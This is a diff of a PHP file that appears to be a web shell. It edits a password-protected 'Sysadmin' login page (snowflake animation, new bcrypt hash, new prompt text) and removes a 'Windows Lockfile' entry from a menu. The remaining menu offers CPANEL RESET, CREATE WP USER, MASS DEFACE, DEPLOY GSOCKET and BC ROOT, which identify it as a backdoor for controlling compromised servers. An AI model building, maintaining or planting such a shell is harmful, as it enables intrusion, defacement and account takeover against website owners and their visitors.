@@ -8,86 +8,91 @@ function show_login_page($message = "")
 {
 ?>
     <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Sysadmin</title>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-                height: 100vh;
-                width: 100vw;
-                background: #000;
-                overflow: hidden; 
-                position: relative;
+<html>
+<head>
+    <title>Sysadmin</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            background: #000;
+            overflow: hidden; 
+            position: relative;
+        }
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: #fff;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1;
+        }
+        .login-container input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        .login-container label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        .snowflake {
+            position: absolute;
+            border-radius: 50%;
+            width: 5px;
+            height: 5px;
+            opacity: 0.8;
+            pointer-events: none;
+            z-index: 0;
+            animation: fall linear;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
             }
-            .login-container {
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                width: 300px;
-                background: #fff;
-                padding: 20px;
-                border: 1px solid #ccc;
-                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-                text-align: center;
-                z-index: 1;
-            }
-            .login-container input {
-                width: calc(100% - 22px);
-                padding: 10px;
-                margin: 10px 0;
-                box-sizing: border-box;
-            }
-            .login-container label {
-                display: block;
-                margin-bottom: 10px;
-            }
-            .snowflake {
-                position: absolute;
-                background: white;
-                border-radius: 50%;
-                width: 5px;
-                height: 5px;
-                opacity: 0.8;
-                pointer-events: none;
-                z-index: 0;
-                animation: fall linear;
-            }
-            @keyframes fall {
-                to {
-                    transform: translateY(100vh);
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <div class="login-container">
-            <form method="POST" action="">
-                <label for="pass">Seven and thirteen dance together, to get The Sacred Ancient Entry Code seek the harmony between them to find the key.</label>
-                <input type="password" id="pass" name="pass" autofocus>
-                <input type="submit" value="acceso">
-            </form>
-        </div>
-        <script>
-            function createSnowflake() {
-                const snowflake = document.createElement('div');
-                snowflake.className = 'snowflake';
-                snowflake.style.left = Math.random() * 100 + 'vw';
-                snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
-                snowflake.style.opacity = Math.random();
-                document.body.appendChild(snowflake);
-                
-                setTimeout(() => {
-                    snowflake.remove();
-                }, 5000); 
-            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <form method="POST" action="">
+            <label for="pass">Harmony awaits.</label>
+            <input type="password" id="pass" name="pass" autofocus>
+            <input type="submit" value="Enter">
+        </form>
+    </div>
+
+    <script>
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
             
-            setInterval(createSnowflake, 100);
-        </script>
-    </body>
-    </html>
+            // Pilih warna acak antara putih atau ungu
+            const colors = ['white', 'purple']; // Menambahkan warna ungu
+            snowflake.style.background = colors[Math.floor(Math.random() * colors.length)];
+            
+            snowflake.style.left = Math.random() * 100 + 'vw';
+            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+            snowflake.style.opacity = Math.random();
+            document.body.appendChild(snowflake);
+            
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000); 
+        }
+
+        setInterval(createSnowflake, 100);
+    </script>
+</body>
+</html>
 <?php
     exit;
 }
@@ -100,7 +105,7 @@ if (isset($_GET['logout'])) {
 }
 
 if (!isset($_SESSION['authenticated'])) {
-    $stored_hashed_password = '$2y$10$y3sCvPRwCUaRW6383IOQ8e3rZqVX4MVlaAWVu/SUg1/6bULlT7GIG'; // https://bcrypt.online/
+    $stored_hashed_password = '$2y$10$uUdGTXDP8/feIQL2eNajoegBMqzo33vszrqVBMerKQKbN/NJrEOA2'; // https://bcrypt.online/
 
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
         $_SESSION['authenticated'] = true;
@@ -694,7 +699,6 @@ if ($_GET['don'] == true) {
             <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
-            <li><a href="" class="btn-submit badge-premium"><i class="fa-brands fa-windows"></i> Windows Lockfile</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&massfile" class="btn-submit"><i class="fa-solid fa-wand-magic-sparkles"></i> MASS DEFACE</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=gsocket" class="btn-submit badge-linux"><i class="fa-regular fa-cube"></i> DEPLOY GSOCKET</a></li>
             <li><a href="" class="btn-submit badge-root"><i class="fa-solid fa-diagram-project"></i> BC ROOT</a></li>
